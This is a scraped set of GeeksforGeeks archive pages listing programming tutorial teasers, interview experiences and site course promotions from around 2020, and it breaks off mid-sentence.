Java-ChronoLocalDate; Java-ChronoLocalDateTime; Java-ChronoZonedDateTime; Java-Class and Object; Java-Collections; Java-concurrent-package; Java-ConcurrentLinkedDeque; Java-ConcurrentSkipListSet; Java-Constructors; Java-CopyOnWriteArrayList; Java-Data Types; Java-Date-Time; Java-DecimalFormat; Java-DecimalFormatSymbols; Java-DoubleBuffer; Java-DoubleStream; Java-Duration; Java-Exception Handling; Java-Exceptions; Java-Field; Java-File Class; Java-file-handling; Java-Functions; Java-guava; Java-HashMap; Java-hashset; Java-HashTable; Java-I/O; Java-inheritance; Java-Instant; Java-Integer; Java-interfaces; Java-intstream; Java-IO package; Java-JSP; Java-lang package; Java-lang-reflect-package; Java-Library; Java-LinkedBlockingDeque; Java-LinkedHashMap; Java-LinkedHashSet; Java-LinkedList; Java-LinkedTransferQueue; Java-list; Java-List-Programs; Java-LocalDate; Java-LocalDateTime; Java-Locale; Java-LocalTime; Java-Logger; Java-LogRecord; Java-longstream; Java-map; Java-Map-Programs; Java-Matcher; Java-math; Java-math-package; Java-Method Class; Java-MonthDay; Java-Multithreading; Java-net-package; Java-Networking; Java-NIO package; Java-NumberFormat; Java-Object Oriented; Java-OffsetDateTime; Java-OffsetTime; Java-Operators; Java-Output; Java-Path; Java-Period; Java-PrintStream; Java-PrintWriter; Java-priority-queue; Java-Properties; Java-reflection-array; Java-regular-expression; Java-security package; Java-set; Java-Set-Programs; Java-ShortBuffer; Java-SortedMap; Java-Spring; Java-Stack; Java-stream; Java-Stream interface; Java-Stream-programs; Java-StrictMath; Java-String-Programs; Java-StringBuffer; Java-StringBuilder; Java-Strings; Java-swing; Java-text package; Java-time package; Java-Time-Chrono package; Java-TreeMap; Java-treeset; Java-util-concurrent-atomic package; Java-Vector; Java-Year; Java-YearMonth; Java-ZonedDateTime; Java-ZoneOffset; Java.lang.Class; Java.lang.Package Class; Java.nio.file package; Java.time.format package; Java.time.temporal package; Java.util.logging package; JavaFX; JavaScript; JavaScript - Underscore.js; Javascript-array; Javascript-basics; Javascript-date; JavaScript-Errors; JavaScript-ES; Javascript-functions; JavaScript-Lodash; Javascript-math; JavaScript-Methods; JavaScript-Misc; Javascript-object; Javascript-operators; JavaScript-p5.js; JavaScript-Properties; JavaScript-RegExp; Javascript-string; Javascript-typedArray; JavaTuples; JDBC; JP Morgan; JQuery; JQuery-Basics; JQuery-Effects; JQuery-Events; JQuery-HTML/CSS; JQuery-Methods; JQuery-Misc; JQuery-Mobile; JQuery-Plugin; JQuery-Selectors; JQuery-Traversing; JS++; JSON; Julia; Kali-Linux; Knapsack; Kotlin; Kotlin Android; Laravel; Large-numbers; LCA; LCM; LCS; Lex program; Lexicographic-ordering; Limited-range-elements; Linked List; Linked Lists; Linked-List-Sorting; Linkedin; Linux; Linux-command; Linux-file-commands; Linux-misc-commands; Linux-networking-commands; Linux-Shell-Commands; Linux-system-commands; Linux-text-processing-commands; Linux-Unix; LIS; Loops & Control Structure; Machine Learning; MakeMyTrip; MAQ Software; Marketing; Materialize-CSS; Math; Mathematical; Maths; Maths-cube; Maths-log; Maths-perfect-square; Maths-power; MATLAB; Matplotlib Artist-class; Matplotlib axes-class; Matplotlib figure-class; Matplotlib Pyplot-class; Matplotlib-Axis Class; Matrix; MCQ; Median-finding; Memoization; Memory-management; Merge Sort; Microprocessor; Microsoft; Misc; Modular Arithmetic; Moment.js; MongoDB; MongoDB-operators; Mongoose; Morgan Stanley; MST; Myntra; Mysql; N-ary-tree; Nagarro; Natural Numbers; Natural-language-processing; NCERT; NCERT Solutions Class-8; NCERT Solutions Class-9; Network-security; Neural Network; Node-Jimp; Node-URL; Node.js; Node.js-Basics; Node.js-Buffer-module; Node.js-crypto-module; Node.js-dns-module; Node.js-fs-module; Node.js-GM; Node.js-Methods; Node.js-Misc; Node.js-os-module; Node.js-process-module; Node.js-Stream-module; Node.js-util-module; Node.js-Zlib-module; NodeJS-function; NP Complete; NPHard; Number Divisibility; Number-digits; Number-theory; Numbers; Off-Campus; Ola Cabs; On-Campus; OpenCV; Operating Systems; Operating Systems-CPU Scheduling; Operating Systems-Memory Management; Operators; Oracle; Order-Statistics; OYO Rooms; Palindrome; Pandas periodIndex; Pandas scalar-period; Pandas-dataframe-program; Parentheses-Problems; Pattern Searching; Pattern-printing; PayPal; Paytm; Payu; Percentages; Perl; Perl-basics; Perl-function; Perl-Math-Functions; Perl-method; Perl-operators; Permutation; Permutation and Combination; Persistent Systems; Philips; PHP; PHP Programs; PHP- Reflection; PHP- ReflectionClass; PHP-array; PHP-ArrayObject; PHP-basics; PHP-date-time; PHP-DOM; PHP-DS\Collection; PHP-ds_deque; PHP-ds_map; PHP-ds_set; PHP-ds_vector; PHP-file-handling; PHP-function; PHP-Gmagick; PHP-gmp; PHP-Imagick; PHP-Intl; PHP-Iterators; PHP-math; PHP-Misc; PHP-OOP; PHP-PHPUnit; PHP-SplFileInfo; PHP-string; PHP-XML; Picked; Placement preparation; Pointers; PostgreSQL; PostgreSQL-dataTypes; PostgreSQL-function; PostgreSQL-managing-table; PostOrder Traversal; Prefix; Prefix-sum; Preorder Traversal; Prime Number; Prime-factor; Priority-queue; Probability; Process Synchronization; Processes & Threads; ProGeek; ProGeek 2.0; Program Output; Programming Language; Programming-puzzle; Project; Puzzles; Pyhton numpy-arrayCreation; PyQt-exercise; Python; Python Bokeh-plotting-figure-class; Python Calander-module; Python Cmath-library; Python Decorators; Python dictionary-programs; Python Django; Python IMDbPY-module; Python List-of-Tuples; Python list-programs; Python math-library; Python math-library-functions; Python numpy-arrayManipulation; Python numpy-Logic Functions; Python Numpy-Masked Array; Python numpy-Mathematical Function; Python numpy-Matrix Function; Python numpy-ndarray; Python numpy-polynomials; Python numpy-program; Python numpy-Random; Python numpy-Statistics Functions; Python numpy-String Operation; Python OS-path-module; Python pandas-dataFrame; Python pandas-dataFrame-methods; Python pandas-datetime; Python pandas-datetimeIndex; Python Pandas-exercise; Python pandas-indexing; Python pandas-panel; Python pandas-panel-methods; Python pandas-series; Python pandas-series-datetime; Python pandas-series-methods; Python pandas-TimedeltaIndex; Python Pandas-Timestamp; Python Programs; Python PyQt-QCalendarWidget; Python PyQt-QColorDialog; Python PyQt-QCommandLinkButton; Python PyQt-QDateEdit; Python PyQt-QDateTimeEdit; Python PyQt-QDockWidget; Python PyQt-QDoubleSpinBox; Python PyQt-QListWidget; Python PyQt-QScrollBar; Python PyQt-SpinBox; Python PyQt-SpinBox-stylesheet; Python PyQt5-ComboBox; Python PyQt5-ComboBox-stylesheet; Python PyQt5-Label; Python scipy-stats-functions; Python string-programs; Python SymPy-Geometry; Python SymPy-Stats; Python Tensorflow-math-functions; Python tuple-programs; Python vlc-library; Python wxPython-Button; Python wxPython-RadioBox; Python wxPython-TreeCtrl; Python-basics; Python-Bokeh; Python-Built-in-functions; Python-ctype; Python-design-pattern; Python-dict; Python-excel; Python-exceptions; Python-file-handling; Python-Functions; Python-gui; Python-itertools; Python-json; Python-kivy; Python-Library; Python-list; Python-list-functions; Python-list-of-lists; Python-Mahotas; Python-matplotlib; Python-Miscellaneous; Python-modules; Python-mongoDB; Python-MoviePy; Python-mySQL; Python-nested-dictionary; Python-nltk; Python-numpy; Python-OOP; Python-oop-concepts; Python-OpenCV; Python-Operators; Python-os-module; Python-Output; Python-Pafy; Python-pandas; Python-pandas-series-str; Python-pgmagick; Python-pil; Python-Plotly; Python-PRAW; Python-projects; Python-PyCairo; Python-PyGame; Python-Pyglet; Python-PyQt; Python-PyQtGraph; Python-PyTorch; Python-random; Python-regex; Python-requests; Python-scipy; Python-Seaborn; Python-selenium; Python-set; Python-sort; Python-string; Python-Tensorflow; Python-tkinter; Python-tuple; Python-turtle; Python-Tweepy; Python-utility; Python-wand; Python-wxPython; QA - Placement Quizzes; Qualcomm; Queue; Quick Sort; R Data-science; R DataFrame-Function; R Language; R List-Function; R Machine-Learning; R Math-Function; R Matrix-Function; R Object-Function; R Statistics-Function; R String-Functions; R Vector-Function; R-Functions; R-plots; R-Statistics; Randomized; RD Sharma Class-10; RD Sharma Class-8; RD Sharma Class-9; RD Sharma Solutions; React-js; Recruitment Process; Recursion; Regular-expression; Reverse; Rotation; Ruby; Ruby Array-class; Ruby BigDecimal-class; Ruby Collections; Ruby Date-class; Ruby DateTime-class; Ruby Enumerable-class; Ruby Float-class; Ruby Hash-class; Ruby Integer-class; Ruby Math-class; Ruby Matrix-class; Ruby Numeric-class; Ruby Rational-class; Ruby Set-class; Ruby String Scanner-class; Ruby String-class; Ruby Symbol-class; Ruby Time-class; Ruby Vector-class; Ruby-Basics; Ruby-Methods; Salesforce; Samsung; SAP Labs; Sapient; SASS; Scala; Scala Immutable-BitSet; Scala Immutable-collection; Scala immutable-TreeSet; Scala Mutable-collections; Scala Mutable-SortedMap; Scala mutable-sortedset; Scala-Basics; Scala-byte; Scala-collection; Scala-Data Type; Scala-list; Scala-Map; Scala-Method; Scala-OOPS; Scala-Set; Scala-Strings; School Learning; School Mathematics; School Programming; School-programming; Script.aculo.us; Searching; Secure-coding; Segment-Tree; Selenium; Self-Balancing-BST; Semantic-UI; SEO; Series; Series-sum; Service Now; SetBitCount; Shortest Path; Sieve; Sliding-window; Snapdeal; Software Engineering; Software Testing; Solidity; Sorting; Sorting Quiz; Sprinklr; SQL; SQL-basics; SQL-Clauses-Operators; SQL-PL/SQL; SQL-Server; SQLmysql; Square-rectangle; Stack; Static Keyword; Statistical-algorithms; STL; Storage Classes and Type Qualifiers; Strings; Strings; Subarray; Subarray-sum; Subsequence; Subset; Substring; Suffix-Array; Swap-Program; SymPy; Synopsys; System-programming; Tableau; TCS; TCS-coding-questions; TCS-interview-experience; Technical Scripter; Technical Scripter 2018; Technical Scripter 2019; Technical Scripter 2020; TechTips; Tensorflow; Theory of Computation & Automata; Time Speed Distance; Topological Sorting; Traversal; Tree; Tree Traversals; Tree-level-order; Tree-traversal; Trees; Triangle; Trie; Two-pointer-algorithm; TypeScript; UGC NET CS 2016 July – III; UGC-NET; UGC-NET-UGC NET CS 2016 July – III; Union-find; United Health Group; Virtualization; Visa; VMWare; Vowel-consonant; Vue.JS; Walmart; Web technologies; Web-API; Web-Programs; Web-scraping; Wipro; Wipro Mock Test; Wipro-interview-experience; Write From Home; Yahoo; Zoho; Difficulty Level Basic Easy Medium Hard Expert Class 10 RD Sharma Solutions – Chapter 7 Statistics – Exercise 7.2 2 Question1: The number of telephone calls received at an exchange per interval for 250 successive one-minute intervals are given in the following frequency table: Number… Read More » RD Sharma SolutionsSchool Learning PickedRD Sharma Class-10 Goldman Sachs Interview Experience for Summer Internship | Off-Campus (2020-21) 2 I applied through the company’s career portal for the Goldman Sachs’ Engineering Campus Hiring Program 2020. Around 1.5 lakh students from all over India (2021… Read More » InternshipInterview Experiences Goldman SachsMarketingOff-Campus How to Close a Tkinter Window With a Button? 2 Prerequisites: Tkinter Python’s Tkinter module offers the Button function to create a button in a Tkinter Window to execute any task once the button is… Read More » PythonTechnical Scripter PickedPython-tkinterTechnical Scripter 2020 Lexicographically largest string possible by reversing substrings having even number of 1s 2 Given a binary string S, the task is to convert the given string S to its lexicographic maximum form by reversing substrings having an even… Read More » SearchingSortingStrings lexicographic-orderingstringssubstring How to Avoid Duplicate User Defined Objects in TreeSet in Java? 2 TreeSet class in Java is part of Java’s collections framework which implements the NavigableSet interface, which provides functionalities to navigate through the SortedSet. The NavigableSet… Read More » JavaJava ProgramsTechnical Scripter java-treesetPickedTechnical Scripter 2020 How to Create Pull Request on GitHub without Using any IDE? 2 Git is an open-source version control system. It means that whenever a developer develops some project (like an app or website) or something, he/she constantly… Read More » GitHow ToTechnical Scripter GitHubTechnical Scripter 2020 How HTTP Evolved Throughout The Years? 2 HTTP… The Protocol of the Web. If you are a person who takes an interest in computer science topics then you might be aware of… Read More » GBlogWeb Technologies Queries to replace subarrays by equal length arrays with at most P replacements allowed for any array element 2 Given an array, arr[] of size N, an integer P and a 2D array Q[][] consisting of queries of the following type: 1 L R… Read More » Arrays array-range-queriesarray-rearrangedisjoint-setsubarrayunion-find Amazon Interview Experience for SDE-1(On Campus) 2.5 Round 1 (Online Assessment 2hr 30min): The assessment consisted of four components, a code debugging section (20 minutes), a coding test (70 minutes), a work… Read More » Interview Experiences AmazonMarketingOn-Campus How to Use CAMView Library in Android Apps? 2 CAMView Library is a simple solution for accessing users’ device camera. By using this library we can access users’ cameras and use to perform so… Read More » AndroidJavaTechnical Scripter androidPickedTechnical Scripter 2020 How to create an empty matrix with NumPy in Python ? 2 The term empty matrix has no rows and no columns. A matrix that contains missing values has at least one row and column, as does… Read More » Python Python numpy-Matrix FunctionPython-numpy Hide Axis, Borders and White Spaces in Matplotlib 2.7 When we draw plots using Matplotlib, the ticks and labels along x-axis & y-axis are drawn too. For drawing creative graphs, many times we hide… Read More » PythonTechnical Scripter Python-matplotlibTechnical Scripter 2020 Find the light bulb with maximum glowing time 2 Given a string S consisting of N unique lowercase alphabets and an array arr[] of length N where character S[i] represents the bulb and arr[i]… Read More » ArraysMathematicalSearchingStrings lexicographic-ordering Find 1st January be Sunday between a range of years in JavaScript ? 2 Given a range of years, the task is to find the year having Sunday on 1st January. Approach: We can use javaScript Dates to get… Read More » CSSHTMLJavaScriptWeb Technologies CSS-MiscHTML-MiscJavaScript-MiscPicked Python Keywords and Identifiers 2 The keywords are some predefined and reserved words in python that have special meaning. Keywords are used to define the syntax of the coding. The… Read More » Python python-basics CardView using RecyclerView in Android with Example 2 RecyclerView is an extended version of ListView and GridView. It works on the ViewHolder design pattern. With the help of RecyclerView, we can add many… Read More » AndroidJavaTechnical Scripter androidPickedTechnical Scripter 2020 How to Load SVG from URL in Android ImageView? 2 It is seen that many Android apps require to use of high-quality images that will not get blur while zooming. So we have to use… Read More » AndroidJava android Java Program to Delete a Column in a Table Using JDBC 2 Before deleting a column in a table, first is need to connect the java application to the database. Java has its own API which JDBC… Read More » JavaJava ProgramsTechnical Scripter JDBCPickedTechnical Scripter 2020 Inserting Images in a PDF using Java 2 To insert an image in a PDF using Java can be done by using a library called iText. iText is a Java library originally created… Read More » JavaJava Programs Picked Java Program to Sort an ArrayList 2.5 ArrayList is the class provided in the Collection framework. In Java, the collection framework is defined in java.util package. ArrayList is used to dynamically stores… Read More » JavaTechnical Scripter PickedTechnical Scripter 2020 « Prev12345678910111213...337338Next » Most popular in Java Arrays in JavaSplit() String method in Java with examplesWhy Java Language is Slower Than CPP for Competitive Programming?Arrays.sort() in Java with examplesReverse a string in Java More related articles in Java For-each loop in JavaMultithreading in JavaHow to iterate any Map in JavaMultidimensional Arrays in JavaCollections in Java room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GFG-Update Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Get Your Dream Job With Amazon SDE Test SeriesTechnical Scripter Event 2020 By GeeksforGeeksBridge the Gap Between Engineering and Your Dream Job - Complete Interview PreparationPlacement 100 : Complete Interview Preparation package you must have this Placement SeasonSpecial 21 - Coding Interview Preparation in 21 Days LockdownWhy companies like Amazon, Microsoft, Google focuses on Data Structures and Algorithms : AnsweredWrite From Home Challenge - Technical Content Writing Event By GeeksforGeeksGeek Week – Celebrate The Biggest Programming Festival With GeeksforGeeksBlack Friday Sale - Grab the Best Deals on GeeksforGeeks CoursesGeeksforGeeks Skill-Dependence Days 2020 - A Battle Against UnemploymentDesign Patterns : A Must Skill to have for Software Developers in 2019Geeks Summer Carnival - A Virtual Fun Festival For CodersGeeks Coding Challenge [GCC 2019] - A Three Day Coding Challenge By GeeksforGeeksHow to Learn Java Collections - A Complete GuideTop 10 Reasons to Learn JavaGeeksforGeeks Complete Interview Preparation Course - Get a Job in your Dream Company!What Should be your Best Strategy for this Placement Season?CAT Preparation 2019: A Complete Preparation Package You Require for Cracking CAT 2019Switch Your Career to Machine Learning - A Complete GuidePrepare For Your Dream Company With Coding Round Contests Test Series - FREE!Coderita - Online Coding Competition For Women By GeeksforGeeksComplete Interview Preparation With Doubt Assistance - INR 90 Lakh Cashback Pool Offer!!Bring Out The Geek In You During COVID-19 OutbreakLearn At Your Own Convenience With GeeksforGeeks's Online CoursesWhat are the Daily Habits for Successful CAT Preparation?CAT 2019 Preparation Strategy : How to Ace the CAT Exam in 4 MonthsAvoid these mistakes while preparing for the CAT ExamYour No-Nonsense Guide From An Organised Coder - Anuj Kumar SharmaDon't Let Your Geographical Location Be A Barrier In Your Success - Live Classes By GeeksforGeeksWhat is new in Data Interpretation and Logical Reasoning in CAT 2019 ? Tag Archives: GFG-Update Prepare For Your Dream Company With Coding Round Contests Test Series – FREE! Last Updated: 26-11-2020 Doesn’t matter if you’re a college student or a working professional – landing the DREAM JOB is a must on every individual’s priority list. And… Read More » GBlogGFG-CourseGFG-Update Black Friday Sale – Grab the Best Deals on GeeksforGeeks Courses Last Updated: 28-11-2020 How to get an Online Course with the best-discounted price? This probably can be termed as the most searched query of the students over the… Read More » GeeksforGeeks InitiativesGFG-CourseGFG-Update Your No-Nonsense Guide From An Organised Coder – Anuj Kumar Sharma Last Updated: 20-11-2020 1 No one can deny that it has always been productive for all the aspiring Software Engineers to have a discussion with the experts of the… Read More » GBlogGFG-Update Technical Scripter Event 2020 By GeeksforGeeks Last Updated: 06-11-2020 2 Everyone knows that the tech enthusiasts hold a strong passion for reading articles – whether it be about their specific domain, cutting-edge technologies, source codes… Read More » GBlogGFG-UpdateTechnical Scripter 2020 Bridge the Gap Between Engineering and Your Dream Job – Complete Interview Preparation Last Updated: 17-11-2020 2.1 In India, lakhs of students enroll themselves in engineering colleges every year to establish a successful career in the engineering discipline. And why not, as… Read More » Advanced Computer SubjectGFG-Update How to Learn Java Collections – A Complete Guide Last Updated: 21-08-2020 3 In the real world, a collection by definition is a group of articles that have similar properties and attributes. Since Java is an Object-Oriented Language… Read More » GBlogJavaGFG-UpdateJava-Collections Complete Interview Preparation With Doubt Assistance – INR 90 Lakh Cashback Pool Offer!! Last Updated: 13-08-2020 Indeed, if you’re preparing for an interview or looking out for doing the same, you must have known that finding out the relevant & worthwhile… Read More » ArticlesGBlogGFG-CourseGFG-Update GeeksforGeeks Skill-Dependence Days 2020 – A Battle Against Unemployment Last Updated: 17-08-2020 Though it’s been more than 70 years of Independence (and yes, we’re very proud & grateful for it), still we’re fighting with one of the… Read More » ArticlesGFG-Update GeeksforGeeks Complete Interview Preparation Course – Get a Job in your Dream Company! Last Updated: 06-07-2020 Indeed, the first step to land up a job in your dream company is the right interview preparation from the beginning. And when thousands of… Read More » GBlogGFG-CourseGFG-Update Geeks Summer Carnival – A Virtual Fun Festival For Coders Last Updated: 13-04-2020 4 The season of Summer has already arrived and so the most exciting period of the year too! Indeed, summer always comes with a new wave… Read More » GBlogGFG-Update Write From Home Challenge – Technical Content Writing Event By GeeksforGeeks Last Updated: 08-06-2020 2.1 When the whole nation is on the verge of lockdown due to COVID-19 pandemic and all Geeks across the country have to stay indoors, how… Read More » GBlogGFG-Update Special 21 – Coding Interview Preparation in 21 Days Lockdown Last Updated: 14-04-2020 The whole nation is in the state of lockdown due to COVID-19 and to win a war against this outbreak, all we can do is… Read More » GBlogGFG-Update Get Your Dream Job With Amazon SDE Test Series Last Updated: 17-08-2020 3.6 Amazon… “Hire and Develop the Best”. One of the Big Four Tech Companies founder Jeff Bezos is now the richest person on this planet. Jeff… Read More » GBlogGFG-CourseGFG-Update Bring Out The Geek In You During COVID-19 Outbreak Last Updated: 07-04-2020 2.7 The world is facing one of the worst epidemics, the outbreak of COVID-19, you all are aware of that and this is not the first… Read More » GBlogGFG-Update Coderita – Online Coding Competition For Women By GeeksforGeeks Last Updated: 02-03-2020 3.6 For many decades, we’ve seen the contribution of women in our society is incredible. Either we talk about occupying the top corporate positions (Indra Nooyi,… Read More » GBlogGFG-Update Page 1 of 3123» Most popular in GFG-Update Get Ahead of Your Peers With GeeksforGeeks's Live CoursesHow has Verbal Ability and Reading Comprehension (VARC) in CAT changed over the years?How has Quantitative Ability in CAT changed over the years?Must know things for CAT Exam 2019; Eligibility Criteria, Important Dates and SyllabusHow is the CAT Exam Different from other MBA Exams? Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceHow to send an email from JavaScript ?How To Create a Countdown Timer Using Python? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Technical Scripter 2020 Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Technical Scripter Event 2020 By GeeksforGeeksHow to Become Data Scientist – A Complete RoadmapBest Way to Become Android Developer – A Complete RoadmapIntroduction to Google Associate Cloud Engineer ExamMVVM (Model View ViewModel) Architecture Pattern in AndroidWhy Java Language is Slower Than CPP for Competitive Programming?MVC (Model View Controller) Architecture Pattern in Android with ExampleHow to change the “checked” background color of toggle switch in Bootstrap 4?Longest Substring of 1's after removing one characterHow to create Show More and Show Less functionality for hiding text using JavaScript ?Authentication Bypass using SQL Injection on Login PageMVP (Model View Presenter) Architecture Pattern in Android with ExampleHow to read large text files in Python?6 Most Useful Chrome Extension for Content WritersFind all the queens attacking the king in a chessboardConvert IP address to integer and vice versaPrint all Unique Strings present in a given Array7 Major Reasons Why Your Android App is Performing Slow - Must Read For Developers!Java Program to Handle Divide By Zero and Multiple ExceptionsJava Program to Convert English Text to Morse Code and Vice-VersaBroadcast Receiver in Android With ExampleConvert given upper triangular Matrix to 1D ArrayAutomate Instagram Messages using PythonBug Tracking SystemSecuring Django Admin login with OTP (2 Factor Authentication)How to Build a Simple Augmented Reality Android App?How to Change the Theme of Code Blocks 20.03 to Dark Mode in Windows 10?Turing Machine for L = {a^n b^n | n>=1}How to Change the Color of a Graph Plot in Matplotlib with Python?8 Best Android Libraries That Every Android Developer Should Know Tag Archives: Technical Scripter 2020 Simple Text editor using File System Access API Last Updated: 20-12-2020 5 In this article, we will create a simple text editor like application that we can use to open, edit, and save text files with the… Read More » CSSHTMLJavaScriptTechnical ScripterCSS-MiscHTML-MiscJavaScript-MiscTechnical Scripter 2020 How to set image to center of an responsive navbar ? Last Updated: 21-12-2020 In order to make a website responsive, the clever to-do is by using Bootstrap. By using Bootstrap, we can make our website look good and… Read More » BootstrapHTMLTechnical ScripterWeb TechnologiesBootstrap-4Bootstrap-MiscHTML-MiscTechnical Scripter 2020 CSS justify-self Property Last Updated: 21-12-2020 The justify-self property is used to specify the alignment of a content’s position along with the appropriate axis in a CSS Grid. Syntax: justify-self: stretch… Read More » CSSHTMLTechnical ScripterWeb TechnologiesCSS-PropertiesTechnical Scripter 2020 script.aculo.us Create Sliders Last Updated: 21-12-2020 A slider is a kind of small track, along which you can slide a handle. It translates into a numerical value. With script.aculo.us’s slider module,… Read More » JavaScriptTechnical ScripterWeb Technologiesscript.aculo.usTechnical Scripter 2020 script.aculo.us Autocompleter tokens Option Last Updated: 21-12-2020 In this article, we will show the effect of Autocompleter Tokens by using JavaScript library named as script.aculo.us, which helps to autocomplete the text fields… Read More » JavaScriptTechnical ScripterWeb Technologiesscript.aculo.usTechnical Scripter 2020 Importance of EPOS System Last Updated: 21-12-2020 EPOS (Electronic Point of Sale) : As the name suggests, is a self-professed computer system that is used to integrate business processes. It mainly provides… Read More » Software EngineeringTechnical ScripterTechnical Scripter 2020 Count of leaf nodes required to be removed at each step to empty a given Binary Tree Last Updated: 18-12-2020 4 Given a Binary Tree, the task is to remove the leaf nodes of the Binary Tree during each operation and print the count. Examples: Input: … Read More » Data StructuresRecursionTechnical ScripterTreeBinary TreeDFSTechnical Scripter 2020tree-traversal Mistakes to avoid while Buying EPOS System Last Updated: 21-12-2020 EPOS System (Electronic Point of Sale), as name suggests, is an electronic system that is especially designed for businesses to increase sales, increase profit, increase… Read More » Software EngineeringTechnical ScripterTechnical Scripter 2020 Need of Package Managers in Developer’s Life Last Updated: 18-12-2020 3 Ever Since Mankind started to program things, they started distributing them to various firms, individuals, etc. One had to install software on its own using… Read More » GBlogTechnical ScripterTechnical Scripter 2020 Why Java Language is Slower Than CPP for Competitive Programming? Last Updated: 18-12-2020 4 Choosing the appropriate language while starting competitive programming is the most important factor. Generally, we choose that language that has short syntax and executes very… Read More » C++Competitive ProgrammingGBlogJavaTechnical ScripterTechnical Scripter 2020 How EPOS help Stock Control Last Updated: 21-12-2020 EPOS (Electronic Point of Sale) : It is an electronic system for recording sales, processing transactions, monitoring, and managing inventories, and creating reports. It speeds… Read More » Software EngineeringTechnical ScripterTechnical Scripter 2020 Difference between WDM and DWDM Last Updated: 21-12-2020 In this article, we are going to discuss the difference between WDM(Wavelength Division Multiplexing) and DWDM(Dense wavelength division multiplexers). Let’s discuss one by one. WDM… Read More » Computer NetworksDifference BetweenTechnical ScripterTechnical Scripter 2020 ToDo App in C Language Last Updated: 18-12-2020 3 ToDo List App is a kind of app that generally used to maintain our day-to-day tasks or list everything that we have to do, with… Read More » CC ProgramsC++ProjectTechnical ScripterTechnical Scripter 2020 Difference between sum of odd and even frequent elements in an Array Last Updated: 17-12-2020 5 Given an array arr[] of integers, the task is to find the absolute difference between the sum of all odd frequent array elements and the… Read More » ArraysHashMathematicalTechnical Scripterfrequency-countingTechnical Scripter 2020 Count pair of integers having even sum Last Updated: 17-12-2020 Given two integers N and M, the task is to count all possible pair of integers (i, j) (1 